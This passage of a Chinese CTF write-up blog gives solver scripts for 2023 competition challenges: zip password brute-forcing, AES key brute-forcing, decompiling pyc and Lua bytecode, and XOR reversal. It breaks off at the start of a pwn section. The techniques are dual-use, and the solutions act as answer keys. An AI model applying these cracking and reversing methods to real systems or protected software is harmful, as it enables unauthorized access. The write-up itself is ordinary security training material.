src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-js-misc1-1.png"></p><h2 id="决赛-Ez-Signin"><a href="#决赛-Ez-Signin" class="headerlink" title="决赛[Ez_Signin]"></a>决赛[Ez_Signin]</h2><p>zip爆破密码，得到<code>11452</code></p><p>base32解密后得到一个文本</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">MoveTo 495, 314<br>KeyUp &quot;CapsLock&quot;, 1<br>LeftClick 1<br>LeftDown 1<br>MoveTo 495, 313<br>MoveTo 495, 312<br>MoveTo 494, 312<br>MoveTo 494, 311<br>MoveTo 493, 311<br>Delay 1<br>...<br>省略<br>...<br>MouseWheel 1<br>Delay 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>KeyDown &quot;CapsLock&quot;, 1<br></code></pre></td></tr></table></figure><p>根据文本内容进行画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">2000</span>,<span class="hljs-number">2000</span>))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>)<br>d=f.read().splitlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;MoveTo&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-keyword">continue</span><br>    i=i[<span class="hljs-number">6</span>:].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>    x=<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>])<br>    y=<span class="hljs-built_in">int</span>(i[<span class="hljs-number">1</span>])<br>    a.putpixel((x,y),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&quot;1.png&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-js-misc2-1.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="初赛-小小数学家"><a href="#初赛-小小数学家" class="headerlink" title="初赛[小小数学家]"></a>初赛[小小数学家]</h2><p>计算式子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[]<br>a.append(<span class="hljs-number">19</span>+<span class="hljs-number">49</span>)<br>a.append(<span class="hljs-number">96</span>-<span class="hljs-number">31</span>)<br>a.append(<span class="hljs-number">86</span>-<span class="hljs-number">3</span>)<br>a.append(<span class="hljs-number">20</span>+<span class="hljs-number">47</span>)<br>a.append(<span class="hljs-number">29</span>+<span class="hljs-number">55</span>)<br>a.append(<span class="hljs-number">35</span>+<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">81</span>+<span class="hljs-number">42</span>)<br>a.append(<span class="hljs-number">73</span>-<span class="hljs-number">16</span>)<br>a.append(<span class="hljs-number">52</span>+<span class="hljs-number">48</span>)<br>a.append(<span class="hljs-number">0</span>+<span class="hljs-number">56</span>)<br>a.append(<span class="hljs-number">55</span>-<span class="hljs-number">6</span>)<br>a.append(<span class="hljs-number">69</span>-<span class="hljs-number">20</span>)<br>a.append(<span class="hljs-number">99</span>-<span class="hljs-number">48</span>)<br>a.append(<span class="hljs-number">100</span>-<span class="hljs-number">52</span>)<br>a.append(<span class="hljs-number">36</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">32</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">84</span>-<span class="hljs-number">34</span>)<br>a.append(<span class="hljs-number">90</span>-<span class="hljs-number">34</span>)<br>a.append(<span class="hljs-number">94</span>-<span class="hljs-number">45</span>)<br>a.append(<span class="hljs-number">85</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">50</span>-<span class="hljs-number">5</span>)<br>a.append(<span class="hljs-number">55</span>-<span class="hljs-number">3</span>)<br>a.append(<span class="hljs-number">77</span>+<span class="hljs-number">25</span>)<br>a.append(<span class="hljs-number">87</span>-<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">62</span>+<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">88</span>-<span class="hljs-number">43</span>)<br>a.append(<span class="hljs-number">86</span>-<span class="hljs-number">30</span>)<br>a.append(<span class="hljs-number">90</span>+<span class="hljs-number">10</span>)<br>a.append(<span class="hljs-number">66</span>-<span class="hljs-number">17</span>)<br>a.append(<span class="hljs-number">34</span>+<span class="hljs-number">63</span>)<br>a.append(<span class="hljs-number">51</span>-<span class="hljs-number">6</span>)<br>a.append(<span class="hljs-number">22</span>+<span class="hljs-number">76</span>)<br>a.append(<span class="hljs-number">46</span>+<span class="hljs-number">5</span>)<br>a.append(<span class="hljs-number">45</span>+<span class="hljs-number">11</span>)<br>a.append(<span class="hljs-number">20</span>+<span class="hljs-number">78</span>)<br>a.append(<span class="hljs-number">56</span>+<span class="hljs-number">45</span>)<br>a.append(<span class="hljs-number">99</span>//<span class="hljs-number">1</span>)<br>a.append(<span class="hljs-number">47</span>+<span class="hljs-number">52</span>)<br>a.append(<span class="hljs-number">58</span>+<span class="hljs-number">44</span>)<br>a.append(<span class="hljs-number">76</span>-<span class="hljs-number">26</span>)<br>a.append(<span class="hljs-number">92</span>-<span class="hljs-number">42</span>)<br>a.append(<span class="hljs-number">12</span>+<span class="hljs-number">44</span>)<br>a.append(<span class="hljs-number">80</span>-<span class="hljs-number">27</span>)<br>a.append(<span class="hljs-number">5</span>*<span class="hljs-number">25</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure><h2 id="初赛-An-EaSy-Cipher"><a href="#初赛-An-EaSy-Cipher" class="headerlink" title="初赛[An EaSy Cipher]"></a>初赛[An EaSy Cipher]</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">[&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08。RUNCIDAgMTI4IHNpeCBudW1iZXJz&quot;,&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&quot;]<br></code></pre></td></tr></table></figure><p>提示：<code>ECB 0 128 six numbers</code></p><p>写脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">c=<span class="hljs-string">&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&quot;</span><br>key=<span class="hljs-string">&quot;RUNCIDAgMTI4IHNpeCBudW1iZXJz&quot;</span><br><br><span class="hljs-comment">#mcrypt是自定义的模块，包含aes</span><br><span class="hljs-keyword">from</span> mcrypt.boom <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> mcrypt.base <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> mcrypt.aes <span class="hljs-keyword">import</span> *<br>base=<span class="hljs-string">&quot;0123456789&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Gendic(base,<span class="hljs-number">6</span>,<span class="hljs-literal">True</span>):<br>    a=aes(<span class="hljs-string">&#x27;&#x27;</span>.join(i),Pad_type=<span class="hljs-number">1</span>)<br>    data=a.decrypt(b64().decode(c))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>),i)<br>        f.write(data)<br>        f.write(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        f.flush()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-crypto1-1.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="初赛-pyccc"><a href="#初赛-pyccc" class="headerlink" title="初赛[pyccc]"></a>初赛[pyccc]</h2><p>使用pycdc反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Source Generated with Decompyle++</span><br><span class="hljs-comment"># File: baby.pyc (Python 3.8)</span><br><br>a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;please input your flag:\n&#x27;</span>)<br>check = [<br>    <span class="hljs-number">102</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">88</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">122</span>,<br>    <span class="hljs-number">85</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">105</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">120</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">98</span>,<br>    <span class="hljs-number">39</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">106</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) == <span class="hljs-number">24</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">if</span> check[i] == <span class="hljs-built_in">ord</span>(a[i]) ^ i:<br>            <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(yes)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;nononono&#x27;</span>)<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;nononono&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">check = [<br>    <span class="hljs-number">102</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">88</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">122</span>,<br>    <span class="hljs-number">85</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">105</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">120</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">98</span>,<br>    <span class="hljs-number">39</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">106</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(check)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(check[i] ^ i), end=<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="初赛-easyapk"><a href="#初赛-easyapk" class="headerlink" title="初赛[easyapk]"></a>初赛[easyapk]</h2><p>密文是<code>HPjVMiy4FxSPc1n0eq52t4jaZ7FNr/qvJMjkusqbG6t8IVzztqflA0VQmVZYgiaC</code>，iv是<code>0123456789ABCDEF</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse1-1.png"></p><p>密钥中e替换成3</p><p><code>final String replaceAll = &quot;reversecarefully&quot;.replaceAll(&quot;e&quot;, &quot;3&quot;);</code></p><p>加密模式是AES</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse1-2.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse1-3.png"></p><h2 id="初赛-luare"><a href="#初赛-luare" class="headerlink" title="初赛[luare]"></a>初赛[luare]</h2><p>先导出lua的字节码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse2-1.png"></p><p>修补文件头为<code>1B 4C 7561 52</code>，其中52是版本号</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse2-2.png"></p><p>使用unluac反编译</p><p><code>java -jar unluac.jar out &gt; out.lua</code></p><p>得到</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CheckAns</span><span class="hljs-params">(data)</span></span><br>  <span class="hljs-keyword">if</span> #data ~= <span class="hljs-number">40</span> <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>  <span class="hljs-keyword">end</span><br>  dataOut = Oo00Oo0(data)<br>  enc = &#123;<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">-72</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">-5</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">-100</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">59</span>,<br>    <span class="hljs-number">32</span>,<br>    <span class="hljs-number">-76</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">59</span>,<br>    <span class="hljs-number">20</span>,<br>    <span class="hljs-number">-61</span>,<br>    <span class="hljs-number">-56</span>,<br>    <span class="hljs-number">-119</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">36</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">82</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">95</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">-80</span>,<br>    <span class="hljs-number">5</span>,<br>    <span class="hljs-number">-89</span>,<br>    <span class="hljs-number">89</span>,<br>    <span class="hljs-number">-85</span>,<br>    <span class="hljs-number">5</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">7</span>,<br>    <span class="hljs-number">127</span><br>  &#125;<br>  i = <span class="hljs-number">1</span><br>  <span class="hljs-keyword">while</span> i &lt;= #dataOut <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> dataOut[i] ~= enc[i] <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    i = i + <span class="hljs-number">1</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;input: &quot;</span>)<br><span class="hljs-keyword">local</span> data = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>()<br><span class="hljs-keyword">if</span> CheckAns(data) <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;true&quot;</span>)<br><span class="hljs-keyword">else</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;false&quot;</span>)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>分析<code>Oo00Oo0</code>函数，简单异或</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse2-3.png"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">v7=[<span class="hljs-number">0</span>]*<span class="hljs-number">32</span><br>v7= [<span class="hljs-number">0x60856D1028C8953C</span>,<span class="hljs-number">0x964849764CB30359</span>,<span class="hljs-number">0x2E7164C479B75FB8</span>,<span class="hljs-number">0x80637291A7AC8C38</span>,<span class="hljs-number">0x7B8BF3AE4B339EB0</span>,\<br>    <span class="hljs-number">0xCFE06FEC52B45B4D</span>,<span class="hljs-number">0x5DC67EAAB20C3AD</span>,<span class="hljs-number">0x24FCFBD656409F00</span>,<span class="hljs-number">0x4AF00D463D0BCA92</span>,<span class="hljs-number">0x7DBC8A3B1A11555A</span>,<span class="hljs-number">0x3061CE7513A9E76C</span>,\<br>    <span class="hljs-number">0x9C54D007276AA614</span>,<span class="hljs-number">0x34C20158D8898E5C</span>,<span class="hljs-number">0x50A02AC02F3569E8</span>,<span class="hljs-number">0xC0E681D39FF8836</span>,<span class="hljs-number">0xB66E7F18FEB1E693</span>,\<br>    <span class="hljs-number">0x29F5D2E92B315378</span>,<span class="hljs-number">0x41D9DBDE84172C0F</span>,<span class="hljs-number">0x7A45A899A1F71906</span>,<span class="hljs-number">0xE5AA0AAF1BA5233E</span>,<span class="hljs-number">0x9A3A82FAF8E1A4EF</span>,\<br>    <span class="hljs-number">0xC1D173C7651C8FDF</span>,<span class="hljs-number">0x8D9DDD875EA2D7C5</span>,<span class="hljs-number">0x66EE9790CD81C9F9</span>,<span class="hljs-number">0x370874C63F424FDA</span>,<span class="hljs-number">0xB93283E32677CB25</span>,\<br>    <span class="hljs-number">0xBA2D4ED544F2D3BD</span>,<span class="hljs-number">0xBFE421121E049862</span>,<span class="hljs-number">0xA31694FDF486F647</span>,<span class="hljs-number">0x430251B27C701FEB</span>,<span class="hljs-number">0x5DE26B097ECC1522</span>,<span class="hljs-number">0xF157EDD4B5BE9BBB</span>]<br>table=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v7:<br>  table+=i.to_bytes(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>table=<span class="hljs-built_in">list</span>(table)<br>enc=[<span class="hljs-number">109</span>,-<span class="hljs-number">73</span>,-<span class="hljs-number">72</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">73</span>,-<span class="hljs-number">5</span>,<span class="hljs-number">99</span>,-<span class="hljs-number">100</span>,<span class="hljs-number">46</span>,<span class="hljs-number">59</span>,<span class="hljs-number">32</span>,-<span class="hljs-number">76</span>,<span class="hljs-number">109</span>,<span class="hljs-number">3</span>,<span class="hljs-number">59</span>,<span class="hljs-number">20</span>,-<span class="hljs-number">61</span>,-<span class="hljs-number">56</span>,\<br>     -<span class="hljs-number">119</span>,<span class="hljs-number">48</span>,<span class="hljs-number">100</span>,<span class="hljs-number">118</span>,<span class="hljs-number">36</span>,<span class="hljs-number">118</span>,<span class="hljs-number">82</span>,<span class="hljs-number">3</span>,<span class="hljs-number">95</span>,<span class="hljs-number">106</span>,<span class="hljs-number">14</span>,-<span class="hljs-number">80</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">89</span>,<span class="hljs-number">89</span>,-<span class="hljs-number">85</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">73</span>,<span class="hljs-number">7</span>,<span class="hljs-number">127</span>]<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(enc):<br>  enc[i]=v&amp;<span class="hljs-number">0xff</span><br><br>flag=[]<br>flag.insert(<span class="hljs-number">0</span>,table.index(enc[-<span class="hljs-number">1</span>]))<br>ind=<span class="hljs-built_in">len</span>(enc)-<span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> ind&gt;=<span class="hljs-number">0</span>:<br>  flag.insert(<span class="hljs-number">0</span>,table.index(enc[ind])^flag[<span class="hljs-number">0</span>])<br>  ind-=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))<br></code></pre></td></tr></table></figure><h2 id="决赛-Ez8or"><a href="#决赛-Ez8or" class="headerlink" title="决赛[Ez8or]"></a>决赛[Ez8or]</h2><p>加密数据再次异或后得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>a=[  <span class="hljs-number">168</span>, <span class="hljs-number">172</span>,  <span class="hljs-number">54</span>, <span class="hljs-number">106</span>, <span class="hljs-number">196</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">154</span>, <span class="hljs-number">220</span>,  <span class="hljs-number">18</span>,  <span class="hljs-number">72</span>,<br>  <span class="hljs-number">242</span>,  <span class="hljs-number">96</span>, <span class="hljs-number">203</span>, <span class="hljs-number">204</span>,  <span class="hljs-number">58</span>,  <span class="hljs-number">94</span>, <span class="hljs-number">242</span>,  <span class="hljs-number">99</span>, <span class="hljs-number">156</span>, <span class="hljs-number">148</span>,<br>  <span class="hljs-number">245</span>,  <span class="hljs-number">72</span>, <span class="hljs-number">205</span>,  <span class="hljs-number">23</span>, <span class="hljs-number">130</span>, <span class="hljs-number">205</span>, <span class="hljs-number">247</span>, <span class="hljs-number">113</span>, <span class="hljs-number">159</span>,  <span class="hljs-number">54</span>,<br>  <span class="hljs-number">180</span>, <span class="hljs-number">136</span>, <span class="hljs-number">175</span>,  <span class="hljs-number">95</span>, <span class="hljs-number">221</span>, <span class="hljs-number">100</span>, <span class="hljs-number">133</span>, <span class="hljs-number">150</span>, <span class="hljs-number">247</span>,  <span class="hljs-number">94</span>,<br>  <span class="hljs-number">196</span>,   <span class="hljs-number">9</span>, <span class="hljs-number">173</span>, <span class="hljs-number">221</span>, <span class="hljs-number">171</span>,  <span class="hljs-number">22</span>, <span class="hljs-number">153</span>,  <span class="hljs-number">96</span>, <span class="hljs-number">155</span>, <span class="hljs-number">222</span>,<br>  <span class="hljs-number">245</span>,  <span class="hljs-number">83</span>, <span class="hljs-number">195</span>,  <span class="hljs-number">33</span>, <span class="hljs-number">252</span>, <span class="hljs-number">128</span>, <span class="hljs-number">248</span>,  <span class="hljs-number">16</span>, <span class="hljs-number">199</span>,  <span class="hljs-number">38</span>]<br><br>p=process(<span class="hljs-string">&quot;./Ez8or&quot;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;bp $rebase(0x1476)&#x27;</span>)<br><span class="hljs-comment"># 修改加密函数的参数为密文地址，函数结束后，查看密文地址处储存的信息</span><br>pause()<br>p.sendline(<span class="hljs-built_in">bytes</span>(a))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="决赛-SafeNote"><a href="#决赛-SafeNote" class="headerlink" title="决赛[SafeNote]"></a>决赛[SafeNote]</h2><p>伪随机数，先获取密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 